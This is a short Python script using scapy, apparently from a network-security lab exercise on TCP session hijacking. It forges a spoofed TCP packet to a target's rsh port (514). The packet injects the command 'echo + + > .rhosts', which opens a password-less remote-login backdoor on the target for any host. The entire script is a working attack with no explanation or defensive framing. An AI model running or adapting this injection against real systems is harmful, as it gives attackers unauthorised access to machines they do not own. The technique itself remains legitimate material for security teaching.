# backdoor_implantation.py
from scapy.all import *

# Sending payload to modify .rhosts file and set up a backdoor
jeytha_ip = IP(src="10.9.0.5", dst="10.9.0.6")
venktcp = TCP(sport=1023, dport=514, flags="A", seq=778933537, ack=399324157)
data = '9090\x00seed\x00dees\x00echo + + > .rhosts\x00'

if venktcp.flags == "A":
    print("Sending backdoor payload...")
    packet = jeytha_ip/venktcp/data
    send(packet, verbose=0)
